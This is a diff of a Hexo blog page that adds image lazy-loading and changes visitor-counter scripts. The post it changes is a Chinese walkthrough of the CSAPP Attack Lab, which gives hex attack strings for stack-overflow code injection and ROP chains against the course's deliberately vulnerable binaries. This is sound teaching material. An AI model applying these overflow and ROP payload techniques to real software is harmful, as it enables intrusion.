@@ -19,7 +19,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"pcj600.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"pcj600.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta name="description" content="实验介绍本实验中，我们需要利用缓冲区溢出漏洞，来修改一个二进制可执行文件的运行时行为。 预备知识 缓冲区溢出的原理，参考《CSAPP原书第3版》3.10小节  gdb和objdump使用  x86_64下的汇编">
@@ -302,7 +302,7 @@
 <li><p><code>hex2raw</code>：将ASCII码转化为字符串的小程序，用于构造攻击字符串。</p>
 </li>
 </ul>
-<p>实验共有5关，每一关的目标如下：<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image1.png"><br><strong>实验前，务必仔细阅读<code>attackLab</code>实验手册，可参考<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">attacklab.pdf</a></strong></p>
+<p>实验共有5关，每一关的目标如下：<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image1.png"><br><strong>实验前，务必仔细阅读<code>attackLab</code>实验手册，可参考<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">attacklab.pdf</a></strong></p>
 <h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>这一关不需注入新的代码，只需要让目标程序<code>ctarget</code>重定向到一个已存在的过程即可。</p>
 <p><code>ctarget</code>中定义了<code>test</code>函数, <code>test</code>函数会调用<code>getbuf</code>函数，C代码如下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> val;</span><br><span class="line">	val = getbuf();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -319,7 +319,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble test</span><br><span class="line">Dump of assembler code for function test:</span><br><span class="line">   0x0000000000401968 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x000000000040196c &lt;+4&gt;:     mov    $0x0,%eax</span><br><span class="line">   0x0000000000401971 &lt;+9&gt;:     callq  0x4017a8 &lt;getbuf&gt; #将下一条指令0x401976压栈，并跳转到getbuf</span><br><span class="line">   0x0000000000401976 &lt;+14&gt;:    mov    %eax,%edx</span><br></pre></td></tr></table></figure>
 
 <p>这里<code>callq</code>指令将<code>0x401976</code>压栈，并跳转到<code>getbuf</code>; <code>getbuf</code>执行结束后，使用<code>retq</code>指令从栈中弹出<code>0x401976</code>，并作为返回地址跳转。</p>
-<p>假设输入字符串是<code>&quot;1234567876543210&quot;</code>， 程序执行到<code>0x4017b4</code>，此时栈组织如下：<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image2.png"><br>因此，我们需要先把栈上<code>40</code>字节填满，然后将<code>touch1</code>的地址写到<code>$rsp + 0x28</code>处，覆盖原先正常的返回地址<code>0x401976</code>。下面找到<code>touch1</code>的地址为<code>0x4017c0</code></p>
+<p>假设输入字符串是<code>&quot;1234567876543210&quot;</code>， 程序执行到<code>0x4017b4</code>，此时栈组织如下：<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image2.png"><br>因此，我们需要先把栈上<code>40</code>字节填满，然后将<code>touch1</code>的地址写到<code>$rsp + 0x28</code>处，覆盖原先正常的返回地址<code>0x401976</code>。下面找到<code>touch1</code>的地址为<code>0x4017c0</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble touch1</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
 
 <p>构造攻击字符串, 写到文件<code>hex1</code></p>
@@ -357,7 +357,7 @@
 <p>综上，得到我们需要输入的字符串</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bf fa 97 b9 59 68 ec 17				# 攻击代码位于地址0x5561dc78</span><br><span class="line">40 00 c3 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00				# 改写返回地址为0x5561dc78</span><br></pre></td></tr></table></figure>
 
-<p>此时的栈组织如下：<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image3.png"></p>
+<p>此时的栈组织如下：<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image3.png"></p>
 <h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p><code>touch3</code>代码如下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">	<span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">	vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		fail(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -387,20 +387,20 @@
 <p>综上，得到我们需要输入字符串</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68				# 攻击代码位于地址0x5561dc78</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00				# 改写返回地址为0x5561dc78</span><br><span class="line">35 39 62 39 39 37 66 61				# cookie字符串</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
 
-<p>此时的栈组织如下：<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image4.png"></p>
+<p>此时的栈组织如下：<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image4.png"></p>
 <h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>在前三关，我们插入攻击代码，同时插入指向攻击代码的指针，而产生这个指针需要跑下代码确认栈的地址。但是在第四、五关的<code>rtarget</code>程序中，采用了如下策略防止代码注入攻击：</p>
 <ul>
 <li><strong>栈随机化</strong>，每次运行相同的程序，它们的栈地址是不同的。</li>
 <li><strong>限制可执行代码区域</strong>，栈是不可执行的。</li>
 </ul>
 <p>既然注入代码不可行，能不能利用已有的可执行代码来实现目的呢？以下介绍一种叫<code>ROP</code>的攻击方式</p>
-<h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>即<code>return-oriented-programming</code>。策略是寻找已有的一些以<code>ret</code>命令结尾的指令(每条这样的指令称为<code>gadget</code>)，通过在这些<code>gadget</code>之间不断跳转，拼凑处我们想要的指令来实现攻击目的，如下图：(<code>c3</code>是<code>retq</code>的字节码)<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image5.png"><br>在<code>rtarget</code>程序中，有很多这样的<code>gadget</code>可以利用，举例如下：</p>
+<h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>即<code>return-oriented-programming</code>。策略是寻找已有的一些以<code>ret</code>命令结尾的指令(每条这样的指令称为<code>gadget</code>)，通过在这些<code>gadget</code>之间不断跳转，拼凑处我们想要的指令来实现攻击目的，如下图：(<code>c3</code>是<code>retq</code>的字节码)<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image5.png"><br>在<code>rtarget</code>程序中，有很多这样的<code>gadget</code>可以利用，举例如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br></pre></td></tr></table></figure>
 
 <p>注意到<code>48 89 c7</code>恰好是<code>movq %rax, %rdi</code>的编码， <code>c3</code>表示<code>ret</code>指令。因此这段代码包含了一个<code>gadget</code>，且起始地址为<code>0x4019a2</code>。也就是说，如果我们改写栈的返回地址到<code>0x4019a2</code>，就可以执行<code>movq %rax, %rdi</code>和<code>ret</code>两条已有指令，绕过了栈上不可执行代码的限制。思路如下：</p>
 <ul>
 <li>将<code>cookie</code>值传递给<code>%rdi</code>，难点在于如何用已有的<code>gadget</code>拼凑出我们需要的指令，可参考如下的指令表。</li>
-<li>将<code>touch2</code>的起始地址放到栈中。查看汇编代码得到<code>touch2</code>地址为<code>0x4017ec</code>。<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image6.png"><br><img src="/2020/08/02/2020-08-02-csapp-buflab/image7.png"><br><img src="/2020/08/02/2020-08-02-csapp-buflab/image8.png"><br><img src="/2020/08/02/2020-08-02-csapp-buflab/image9.png"></li>
+<li>将<code>touch2</code>的起始地址放到栈中。查看汇编代码得到<code>touch2</code>地址为<code>0x4017ec</code>。<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image6.png"><br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image7.png"><br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image8.png"><br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image9.png"></li>
 </ul>
 <p>另外，<code>ret</code>的字节编码是<code>0xc3</code>；<code>nop</code>的字节编码是<code>0x90</code>，啥也不做，只是将<code>%rip</code>加1。</p>
 <p>可以在<code>start_farm</code>和<code>end_farm</code>之间找到所有可利用的<code>gadget</code>。</p>
@@ -412,7 +412,7 @@
 <p>到此，我们完成了<code>gadget</code>的拼凑，输入的字符串如下：</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00							# 改写返回地址为0x4019ab, 执行popq %rax</span><br><span class="line">fa 97 b9 59 00 00 00 00							# 保存cookie的值: 0x59b997fa</span><br><span class="line">a2 19 40 00 00 00 00 00							# 执行mov %rax, %rdi</span><br><span class="line">ec 17 40 00 00 00 00 00							# 跳转到touch2, touch2起始地址为0x4017ec</span><br></pre></td></tr></table></figure>
 
-<p>此时的栈组织如下：<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image10.png"></p>
+<p>此时的栈组织如下：<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image10.png"></p>
 <h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>和第三关类似，这关需要将<code>cookie</code>字符串的首地址传给<code>%rdi</code>, 再调用<code>touch3</code>。</p>
 <p>由于栈位置是随机的，需要用<strong>栈顶地址+偏移</strong>来确定<code>cookie</code>串的位置。 栈顶地址即<code>$rsp</code>，可通过<code>mov %rsp XXX</code>获取，偏移需要根据<code>gadget</code>指令的长度来确定。</p>
 <p>如何将<code>cookie</code>串地址传到<code>%rdi</code>呢？可以在<code>farm.o</code>中可以找到如下的<code>gadget</code></p>
@@ -453,7 +453,7 @@
 <p>输入的字符串如下：</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ad 1a 40 00 00 00 00 00			# 改写返回地址为0x401aad</span><br><span class="line">a2 19 40 00 00 00 00 00			# 计算偏移的起始地址，返回地址+0x8</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">48 00 00 00 00 00 00 00			# 确定偏移为0x48</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00			# touch3首地址为0x4018fa</span><br><span class="line">35 39 62 39 39 37 66 61			# cookie字符串地址，用这个地址减去计算偏移的起始地址得到偏移量为72, 即0x48</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
 
-<p>此时的栈组织如下：<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image11.png"></p>
+<p>此时的栈组织如下：<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image11.png"></p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过这次实验，初步了解栈和缓冲区溢出的原理，以及安全编码的重要性。</p>
 <h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《深入理解计算机系统 原书第3版》</p>
 <p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/db731ca57342">CSAPP:Attack lab</a></p>
@@ -613,6 +613,11 @@
       </div>
   </nav>
 </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/nju_pc@163.com" title="E-Mail → nju_pc@163.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
 
 
 
@@ -659,39 +664,9 @@
   </div>
 -->
 
-<div class="powered-by">
-    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <i class="fa fa-user-md"></i>
-    <span id="busuanzi_container_site_uv">
-        本站访客数:<span id="busuanzi_value_site_uv"></span>
-    </span>
-    <span class="post-meta-divider">|</span>
-    <span id="busuanzi_container_site_pv">
-        本站访问量<span id="busuanzi_value_site_pv"></span>
-    </span>
-</div>
-
         
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-user"></i>
-      </span>
-      <span class="site-uv" title="总访客量">
-        <span id="busuanzi_value_site_uv"></span>
-      </span>
-    </span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-eye"></i>
-      </span>
-      <span class="site-pv" title="总访问量">
-        <span id="busuanzi_value_site_pv"></span>
-      </span>
-    </span>
-</div>
+  <script async src="/js/busuanzi.js"></script>
+
 
 
 
@@ -706,6 +681,7 @@
 
   
   <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
   <script src="/lib/velocity/velocity.min.js"></script>
   <script src="/lib/velocity/velocity.ui.min.js"></script>
 
